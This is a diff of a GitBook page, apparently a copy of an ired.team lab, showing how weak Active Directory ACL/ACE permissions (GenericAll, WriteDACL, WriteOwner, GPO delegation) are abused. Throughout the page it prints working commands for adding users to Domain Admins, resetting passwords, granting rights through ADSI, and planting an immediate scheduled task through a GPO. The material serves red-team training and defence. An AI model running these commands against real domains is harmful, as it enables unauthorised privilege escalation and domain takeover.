@@ -1,26 +1,26 @@
 # Abusing Active Directory ACLs/ACEs
 
-**This information was copied from** [**https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **because it's just perfect**
+**This information was copied from **[**https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)** because it's just perfect**
 
 ## Context
 
-This lab is to abuse weak permissions of Active Directory Discretionary Access Control Lists \(DACLs\) and Acccess Control Entries \(ACEs\) that make up DACLs.
+This lab is to abuse weak permissions of Active Directory Discretionary Access Control Lists (DACLs) and Acccess Control Entries (ACEs) that make up DACLs.
 
-Active Directory objects such as users and groups are securable objects and DACL/ACEs define who can read/modify those objects \(i.e change account name, reset password, etc\). 
+Active Directory objects such as users and groups are securable objects and DACL/ACEs define who can read/modify those objects (i.e change account name, reset password, etc). 
 
 An example of ACEs for the "Domain Admins" securable object can be seen here:
 
-![](../../.gitbook/assets/1%20%281%29.png)
+![](../../.gitbook/assets/1.png)
 
 Some of the Active Directory object permissions and types that we as attackers are interested in:
 
-* **GenericAll** - full rights to the object \(add users to a group or reset user's password\)
-* **GenericWrite** - update object's attributes \(i.e logon script\)
+* **GenericAll** - full rights to the object (add users to a group or reset user's password)
+* **GenericWrite** - update object's attributes (i.e logon script)
 * **WriteOwner** - change object owner to attacker controlled user take over the object
 * **WriteDACL** - modify object's ACEs and give attacker full control right over the object
 * **AllExtendedRights** - ability to add user to a group or reset password
 * **ForceChangePassword** - ability to change user's password
-* **Self \(Self-Membership\)** - ability to add yourself to a group
+* **Self (Self-Membership)** - ability to add yourself to a group
 
 In this lab, we are going to explore and try to exploit most of the above ACEs.
 
@@ -58,7 +58,7 @@ We can see that our attacking user `spotless` has `GenericAll` rights once again
 
 ![](../../.gitbook/assets/5.png)
 
-Effectively, this allows us to add ourselves \(the user `spotless`\) to the `Domain Admin` group:
+Effectively, this allows us to add ourselves (the user `spotless`) to the `Domain Admin` group:
 
 ```csharp
 net group "domain admins" spotless /add /domain
@@ -94,7 +94,7 @@ net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domai
 
 ![](../../.gitbook/assets/8.png)
 
-## Self \(Self-Membership\) on Group
+## Self (Self-Membership) on Group
 
 Another privilege that enables the attacker adding themselves to a group:
 
@@ -106,7 +106,7 @@ net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domai
 
 ![](../../.gitbook/assets/10.png)
 
-## WriteProperty \(Self-Membership\)
+## WriteProperty (Self-Membership)
 
 One more privilege that enables the attacker adding themselves to a group:
 
@@ -167,8 +167,8 @@ rpcclient -U KnownUsername 10.10.10.192
 More info:
 
 * [https://malicious.link/post/2017/reset-ad-user-password-with-linux/](https://malicious.link/post/2017/reset-ad-user-password-with-linux/)
-* [https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-samr/6b0dff90-5ac0-429a-93aa-150334adabf6?redirectedfrom=MSDN](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/6b0dff90-5ac0-429a-93aa-150334adabf6?redirectedfrom=MSDN)
-* [https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-samr/e28bf420-8989-44fb-8b08-f5a7c2f2e33c](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/e28bf420-8989-44fb-8b08-f5a7c2f2e33c)
+* [https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/6b0dff90-5ac0-429a-93aa-150334adabf6?redirectedfrom=MSDN](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/6b0dff90-5ac0-429a-93aa-150334adabf6?redirectedfrom=MSDN)
+* [https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/e28bf420-8989-44fb-8b08-f5a7c2f2e33c](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/e28bf420-8989-44fb-8b08-f5a7c2f2e33c)
 
 ## WriteOwner on Group
 
@@ -230,7 +230,7 @@ And you have a `WriteDACL` on that AD object:
 
 ![](../../.gitbook/assets/24.png)
 
-...you can give yourself [`GenericAll`]() privileges with a sprinkle of ADSI sorcery:
+...you can give yourself [`GenericAll`](broken-reference) privileges with a sprinkle of ADSI sorcery:
 
 ```csharp
 $ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
@@ -258,12 +258,12 @@ Set-Acl -Path $path -AclObject $acl
 
 ![](../../.gitbook/assets/26.png)
 
-## **Replication on the domain \(DCSync\)**
+## **Replication on the domain (DCSync)**
 
-The **DCSync** permission implies having these permissions over the domain itself: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** and **Replicating Directory Changes In Filtered Set**.  
-[**Learn more about the DCSync attack here.**](dcsync.md)\*\*\*\*
+The **DCSync **permission implies having these permissions over the domain itself: **DS-Replication-Get-Changes**, **Replicating Directory Changes All **and **Replicating Directory Changes In Filtered Set**.\
+[**Learn more about the DCSync attack here.**](dcsync.md)****
 
-## GPO Delegation <a id="gpo-delegation"></a>
+## GPO Delegation <a href="gpo-delegation" id="gpo-delegation"></a>
 
 Sometimes, certain users/groups may be delegated access to manage Group Policy Objects as is the case with `offense\spotless` user:
 
@@ -279,9 +279,9 @@ The below indicates that the user `offense\spotless` has **WriteProperty**, **Wr
 
 ![](../../.gitbook/assets/a14.png)
 
-\*\*\*\*[**More about general AD ACL/ACE abuse here.**](acl-persistence-abuse.md)\*\*\*\*
+****[**More about general AD ACL/ACE abuse here.**](acl-persistence-abuse.md)****
 
-### Abusing the GPO Permissions <a id="abusing-the-gpo-permissions"></a>
+### Abusing the GPO Permissions <a href="abusing-the-gpo-permissions" id="abusing-the-gpo-permissions"></a>
 
 We know the above ObjectDN from the above screenshot is referring to the `New Group Policy Object` GPO since the ObjectDN points to `CN=Policies` and also the `CN={DDC640FF-634A-4442-BC2E-C05EED132F0C}` which is the same in the GPO settings as highlighted below:
 
@@ -295,37 +295,37 @@ Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityRefere
 
 ![](../../.gitbook/assets/a16.png)
 
-#### Computers with a Given Policy Applied <a id="computers-with-a-given-policy-applied"></a>
+#### Computers with a Given Policy Applied <a href="computers-with-a-given-policy-applied" id="computers-with-a-given-policy-applied"></a>
 
 We can now resolve the computer names the GPO `Misconfigured Policy` is applied to:
 
-```text
+```
 Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}
 ```
 
 ![](../../.gitbook/assets/a17.png)
 
-#### Policies Applied to a Given Computer <a id="policies-applied-to-a-given-computer"></a>
+#### Policies Applied to a Given Computer <a href="policies-applied-to-a-given-computer" id="policies-applied-to-a-given-computer"></a>
 
-```text
+```
 Get-DomainGPO -ComputerIdentity ws01 -Properties Name, DisplayName
 ```
 
-![](https://blobs.gitbook.com/assets%2F-LFEMnER3fywgFHoroYn%2F-LWNAqc8wDhu0OYElzrN%2F-LWNBOmSsNrObOboiT2E%2FScreenshot%20from%202019-01-16%2019-44-19.png?alt=media&token=34332022-c1fc-4f97-a7e9-e0e4d98fa8a5)
+![](https://blobs.gitbook.com/assets%2F-LFEMnER3fywgFHoroYn%2F-LWNAqc8wDhu0OYElzrN%2F-LWNBOmSsNrObOboiT2E%2FScreenshot%20from%202019-01-16%2019-44-19.png?alt=media\&token=34332022-c1fc-4f97-a7e9-e0e4d98fa8a5)
 
-#### OUs with a Given Policy Applied <a id="ous-with-a-given-policy-applied"></a>
+#### OUs with a Given Policy Applied <a href="ous-with-a-given-policy-applied" id="ous-with-a-given-policy-applied"></a>
 
-```text
+```
 Get-DomainOU -GPLink "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" -Properties DistinguishedName
 ```
 
-![](https://blobs.gitbook.com/assets%2F-LFEMnER3fywgFHoroYn%2F-LWNAqc8wDhu0OYElzrN%2F-LWNBtLT332kTVDzd5qV%2FScreenshot%20from%202019-01-16%2019-46-33.png?alt=media&token=ec90fdc0-e0dc-4db0-8279-cde4720df598)
+![](https://blobs.gitbook.com/assets%2F-LFEMnER3fywgFHoroYn%2F-LWNAqc8wDhu0OYElzrN%2F-LWNBtLT332kTVDzd5qV%2FScreenshot%20from%202019-01-16%2019-46-33.png?alt=media\&token=ec90fdc0-e0dc-4db0-8279-cde4720df598)
 
-#### Abusing Weak GPO Permissions <a id="abusing-weak-gpo-permissions"></a>
+#### Abusing Weak GPO Permissions <a href="abusing-weak-gpo-permissions" id="abusing-weak-gpo-permissions"></a>
 
 One of the ways to abuse this misconfiguration and get code execution is to create an immediate scheduled task through the GPO like so:
 
-```text
+```
 New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
 ```
 
@@ -335,13 +335,13 @@ The above will add our user spotless to the local `administrators` group of the 
 
 ![](../../.gitbook/assets/a20.png)
 
-### Force Policy Update <a id="force-policy-update"></a>
+### Force Policy Update <a href="force-policy-update" id="force-policy-update"></a>
 
-ScheduledTask and its code will execute after the policy updates are pushed through \(roughly each 90 minutes\), but we can force it with `gpupdate /force` and see that our user `spotless` now belongs to local administrators group:
+ScheduledTask and its code will execute after the policy updates are pushed through (roughly each 90 minutes), but we can force it with `gpupdate /force` and see that our user `spotless` now belongs to local administrators group:
 
 ![](../../.gitbook/assets/a21.png)
 
-### Under the hood <a id="under-the-hood"></a>
+### Under the hood <a href="under-the-hood" id="under-the-hood"></a>
 
 If we observe the Scheduled Tasks of the `Misconfigured Policy` GPO, we can see our `evilTask` sitting there:
 
@@ -349,7 +349,7 @@ If we observe the Scheduled Tasks of the `Misconfigured Policy` GPO, we can see 
 
 Below is the XML file that got created by `New-GPOImmediateTask` that represents our evil scheduled task in the GPO:
 
-{% code title="\\\\offense.local\\SysVol\\offense.local\\Policies\\{DDC640FF-634A-4442-BC2E-C05EED132F0C}\\Machine\\Preferences\\ScheduledTasks\\ScheduledTasks.xml" %}
+{% code title="\\offense.local\SysVol\offense.local\Policies\{DDC640FF-634A-4442-BC2E-C05EED132F0C}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml" %}
 ```markup
 <?xml version="1.0" encoding="utf-8"?>
 <ScheduledTasks clsid="{CC63F200-7309-4ba0-B154-A71CD118DBCC}">
@@ -410,11 +410,11 @@ Below is the XML file that got created by `New-GPOImmediateTask` that represents
 ```
 {% endcode %}
 
-### Users and Groups <a id="users-and-groups"></a>
+### Users and Groups <a href="users-and-groups" id="users-and-groups"></a>
 
 The same privilege escalation could be achieved by abusing the GPO Users and Groups feature. Note in the below file, line 6 where the user `spotless` is added to the local `administrators` group - we could change the user to something else, add another one or even add the user to another group/multiple groups since we can amend the policy configuration file in the shown location due to the GPO delegation assigned to our user `spotless`:
 
-{% code title="\\\\offense.local\\SysVol\\offense.local\\Policies\\{DDC640FF-634A-4442-BC2E-C05EED132F0C}\\Machine\\Preferences\\Groups" %}
+{% code title="\\offense.local\SysVol\offense.local\Policies\{DDC640FF-634A-4442-BC2E-C05EED132F0C}\Machine\Preferences\Groups" %}
 ```markup
 <?xml version="1.0" encoding="utf-8"?>
 <Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
@@ -441,5 +441,4 @@ Additionally, we could think about leveraging logon/logoff scripts, using regist
 
 {% embed url="https://adsecurity.org/?p=3658" %}
 
-{% embed url="https://docs.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2\#System\_DirectoryServices\_ActiveDirectoryAccessRule\_\_ctor\_System\_Security\_Principal\_IdentityReference\_System\_DirectoryServices\_ActiveDirectoryRights\_System\_Security\_AccessControl\_AccessControlType\_" %}
-
+{% embed url="https://docs.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_" %}
